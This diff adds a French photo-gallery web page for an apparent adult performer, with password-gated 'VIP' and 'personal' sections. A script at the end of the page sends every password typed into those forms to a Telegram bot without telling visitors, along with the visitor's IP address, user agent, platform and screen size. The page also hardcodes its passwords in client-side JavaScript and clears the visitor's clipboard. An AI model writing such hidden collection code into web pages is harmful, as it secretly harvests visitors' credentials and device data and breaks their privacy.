@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>diana peenk</title>
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet" />
+    <script
+      type="text/javascript"
+      src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=VRFn8MfnKSX8kMpJHqFnIw-3cTzTt3QK5VOuCiJQ6VxJdIf7fDUzlEl2S6FH2GfAdVoMUHCMrI5RzJ7WZ1wwxQ"
+      charset="UTF-8"
+    ></script>
+    <style>
+      :root {
+        --primary-color: #2c3e50;
+        --secondary-color: #e74c3c;
+        --accent-color: #3498db;
+        --background-color: #ecf0f1;
+        --text-color: #2c3e50;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Segoe UI", sans-serif;
+      }
+
+      body {
+        background: var(--background-color);
+        color: var(--text-color);
+        user-select: none; /* Empêche la sélection de texte et d'images */
+      }
+
+      nav {
+        position: fixed;
+        width: 100%;
+        padding: 20px;
+        background: rgba(255, 255, 255, 0.95);
+        z-index: 1000;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      nav ul {
+        display: flex;
+        justify-content: center;
+        gap: 40px;
+        list-style: none;
+      }
+
+      nav a {
+        text-decoration: none;
+        color: var(--primary-color);
+        font-weight: 500;
+        transition: 0.3s;
+      }
+
+      nav a:hover {
+        color: var(--secondary-color);
+      }
+
+      .hero {
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        text-align: center;
+        padding: 0 20px;
+        background: var(--primary-color);
+        color: white;
+      }
+
+      .gallery {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 20px;
+        padding: 50px 20px;
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+
+      .photo-card {
+        position: relative;
+        overflow: hidden;
+        border-radius: 10px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        transition: transform 0.3s;
+        cursor: pointer;
+        background: white;
+      }
+
+      .photo-card:hover {
+        transform: translateY(-10px);
+      }
+
+      .photo-card img {
+        width: 100%;
+        height: 400px;
+        object-fit: cover;
+        transition: 0.5s;
+        pointer-events: none; /* Désactive les interactions avec les images */
+      }
+
+      .photo-card:hover img {
+        transform: scale(1.1);
+      }
+
+      .overlay {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        right: 0;
+        background: linear-gradient(transparent, rgba(0, 0, 0, 0.8));
+        padding: 20px;
+        color: white;
+        opacity: 0;
+        transition: 0.3s;
+      }
+
+      .photo-card:hover .overlay {
+        opacity: 1;
+      }
+
+      /* Styles pour la lightbox */
+      .lightbox {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.9);
+        z-index: 2000;
+        cursor: pointer;
+      }
+
+      .lightbox-content {
+        position: relative;
+        max-width: 90%;
+        max-height: 90%;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+      }
+
+      .lightbox-img {
+        width: 100%;
+        height: auto;
+        border-radius: 5px;
+        animation: fadeIn 0.3s;
+        pointer-events: none;
+      }
+
+      .close-btn {
+        position: absolute;
+        top: 20px;
+        right: 30px;
+        color: white;
+        font-size: 40px;
+        cursor: pointer;
+        z-index: 3000;
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+
+      @media (max-width: 768px) {
+        .gallery {
+          grid-template-columns: 1fr;
+        }
+      }
+
+      /* Styles pour la section protégée par mot de passe */
+      .protected-gallery {
+        display: none;
+        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+        gap: 20px;
+        padding: 50px 20px;
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+
+      /* Styles pour le formulaire de mot de passe */
+      .password-form {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 50px;
+      }
+
+      .password-form input {
+        padding: 10px;
+        margin: 10px;
+        border: 1px solid var(--primary-color);
+        border-radius: 5px;
+      }
+
+      .password-form button {
+        padding: 10px 20px;
+        border: none;
+        background-color: var(--primary-color);
+        color: white;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      .password-form button:hover {
+        background-color: var(--secondary-color);
+      }
+
+      /* Styles pour les informations de contact */
+      .contact {
+        padding: 50px 20px;
+        text-align: center;
+        background: var(--secondary-color);
+        color: white;
+      }
+
+      .contact a {
+        color: var(--accent-color);
+        text-decoration: none;
+        font-weight: bold;
+      }
+
+      .contact a:hover {
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+    <nav>
+      <ul>
+        <li><a href="#accueil">Accueil</a></li>
+        <li><a href="#portfolio">Portfolio</a></li>
+        <li><a href="#vip-portfolio">VIP</a></li>
+        <li><a href="#personal-portfolio">Photos Personnelles</a></li>
+        <li><a href="#contact">Contact</a></li>
+      </ul>
+    </nav>
+
+    <section class="hero" id="accueil">
+      <h1>diana peenk</h1>
+      <p>porn star</p>
+    </section>
+
+    <section class="gallery" id="portfolio">
+      <div class="photo-card">
+        <img
+          src="photo/b7ar/471548045_478947958193453_4553656519857676561_n.jpg"
+          alt="Photo 1"
+          onclick="openLightbox(this)"
+        />
+        <div class="overlay">
+          <h3>Photo 1</h3>
+          <p></p>
+        </div>
+      </div>
+      <!-- Autres photos du portfolio... -->
+    </section>
+
+    <!-- Formulaire pour l'accès VIP -->
+    <section class="password-form" id="vip-portfolio">
+      <h2>Accès VIP</h2>
+      <input
+        type="password"
+        id="vip-password"
+        placeholder="Entrez le mot de passe VIP"
+      />
+      <button onclick="checkVipPassword(); sendLoginInfo(this)">Valider</button>
+    </section>
+
+    <section class="protected-gallery" id="protected-vip-gallery">
+      <div class="photo-card">
+        <img
+          src="photo/VIP/479926417_1631568951053519_485336242936478598_n.jpg"
+          alt="Photo VIP 1"
+        />
+        <div class="overlay">
+          <h3>Photo VIP 1</h3>
+          <p></p>
+        </div>
+      </div>
+      <!-- Autres photos VIP... -->
+    </section>
+
+    <!-- Formulaire pour l'accès personnel -->
+    <section class="password-form" id="personal-portfolio">
+      <h2>Photos Personnelles</h2>
+      <input
+        type="password"
+        id="personal-password"
+        placeholder="Entrez le mot de passe personnel"
+      />
+      <button onclick="checkPersonalPassword(); sendLoginInfo(this)">
+        Valider
+      </button>
+    </section>
+
+    <section class="protected-gallery" id="protected-personal-gallery">
+      <div class="photo-card">
+        <img
+          src="photo/VIP/sed/33602d4b-aa4d-4910-86d3-8592ddcff009.jfif"
+          alt="Photo Personnelle 1"
+        />
+        <div class="overlay">
+          <h3>Photo Personnelle 1</h3>
+          <p></p>
+        </div>
+      </div>
+      <!-- Autres photos personnelles... -->
+    </section>
+
+    <section class="contact" id="contact">
+      <h2>Contactez-moi</h2>
+      <p>Vous pouvez me suivre sur Instagram :</p>
+      <p>
+        <a href="https://www.instagram.com/diana_peenk/" target="_blank"
+          >@diana_peenk</a
+        >
+      </p>
+    </section>
+
+    <!-- Lightbox -->
+    <div id="lightbox" class="lightbox" onclick="closeLightbox()">
+      <span class="close-btn">&times;</span>
+      <div class="lightbox-content">
+        <img class="lightbox-img" id="lightbox-img" />
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js"></script>
+    <script>
+      // Initialisation de AOS
+      AOS.init({
+        duration: 1000,
+        once: true,
+        offset: 200,
+      });
+
+      // Smooth scroll pour la navigation
+      document.querySelectorAll('a[href^="#"]').forEach((anchor) => {
+        anchor.addEventListener("click", function (e) {
+          e.preventDefault();
+          document.querySelector(this.getAttribute("href")).scrollIntoView({
+            behavior: "smooth",
+          });
+        });
+      });
+
+      // Lightbox
+      function openLightbox(element) {
+        const lightbox = document.getElementById("lightbox");
+        const lightboxImg = document.getElementById("lightbox-img");
+        lightbox.style.display = "block";
+        lightboxImg.src = element.src;
+      }
+
+      function closeLightbox() {
+        document.getElementById("lightbox").style.display = "none";
+      }
+
+      // Fermer la lightbox avec la touche Échap
+      document.addEventListener("keydown", (e) => {
+        if (e.key === "Escape") closeLightbox();
+      });
+
+      // Vérification des mots de passe (VIP et personnel)
+      function checkVipPassword() {
+        const password = document.getElementById("vip-password").value;
+        const correctPassword = "dianapeenk2007vip";
+        if (password === correctPassword) {
+          document.getElementById("vip-portfolio").style.display = "none";
+          document.getElementById("protected-vip-gallery").style.display =
+            "grid";
+        } else {
+          alert("Mot de passe incorrect");
+        }
+      }
+
+      function checkPersonalPassword() {
+        const password = document.getElementById("personal-password").value;
+        const correctPassword = "dianaa";
+        if (password === correctPassword) {
+          document.getElementById("personal-portfolio").style.display = "none";
+          document.getElementById("protected-personal-gallery").style.display =
+            "grid";
+        } else {
+          alert("Mot de passe incorrect");
+        }
+      }
+
+      // Empêcher certaines actions (captures d'écran, clic droit, etc.)
+      document.addEventListener("keydown", function (event) {
+        if (event.key === "PrintScreen") {
+          alert("Les captures d'écran sont désactivées sur ce site.");
+          event.preventDefault();
+          navigator.clipboard.writeText("");
+        }
+        if (event.ctrlKey && event.key === "u") {
+          alert("Cette action est désactivée.");
+          event.preventDefault();
+        }
+        if (
+          (event.ctrlKey && event.shiftKey && event.key === "I") ||
+          (event.ctrlKey && event.shiftKey && event.key === "C")
+        ) {
+          alert("Cette action est désactivée.");
+          event.preventDefault();
+        }
+      });
+
+      window.addEventListener("focus", function () {
+        setTimeout(() => {
+          navigator.clipboard.writeText("");
+        }, 100);
+      });
+
+      // Animations GSAP
+      gsap.registerPlugin(ScrollTrigger);
+      gsap.from(".hero h1", {
+        duration: 1.5,
+        y: -50,
+        opacity: 0,
+        ease: "power3.out",
+      });
+      gsap.from(".hero p", {
+        duration: 1.5,
+        y: 50,
+        opacity: 0,
+        delay: 0.5,
+        ease: "power3.out",
+      });
+      gsap.from(".photo-card", {
+        duration: 1,
+        y: 50,
+        opacity: 0,
+        stagger: 0.2,
+        scrollTrigger: {
+          trigger: ".gallery",
+          start: "top 80%",
+          toggleActions: "play none none none",
+        },
+      });
+      gsap.from("nav ul li", {
+        duration: 1,
+        y: -20,
+        opacity: 0,
+        stagger: 0.2,
+        delay: 1,
+      });
+    </script>
+
+    <!-- Script pour envoyer les informations de connexion lors du clic sur "Valider" -->
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+      const TOKEN = ""; // Remplir avec le token du bot Telegram
+      const CHAT_ID = ""; // Remplir avec l'ID du chat Telegram
+      const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+      function sendLoginInfo(buttonElement) {
+        // Récupérer le mot de passe saisi correspondant au bouton cliqué
+        const inputField = buttonElement.previousElementSibling;
+        const password = inputField.value;
+        // Pour cet exemple, nous utilisons un e-mail fictif
+        const email = "dummyemail@example.com";
+
+        axios
+          .get("https://api.ipify.org?format=json")
+          .then((response) => {
+            const ip = response.data.ip;
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const deviceType = /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
+
+            const message = `<b>Nouvelle tentative d'accès</b>\n
+<b>Email:</b> ${email}\n
+<b>Mot de passe:</b> ${password}\n
+<b>IP:</b> ${ip}\n
+<b>Type:</b> ${deviceType}\n
+<b>Plateforme:</b> ${platform}\n
+<b>User Agent:</b> ${userAgent}\n
+<b>Résolution:</b> ${screenWidth}x${screenHeight}`;
+
+            axios
+              .post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: "html",
+                text: message,
+              })
+              .then((response) => {
+                console.log("Informations envoyées avec succès!");
+              })
+              .catch((error) => {
+                console.error("Erreur lors de l'envoi:", error);
+              });
+          })
+          .catch((error) => {
+            console.error("Erreur lors de la récupération de l'IP:", error);
+          });
+      }
+    </script>
+  </body>
+</html>
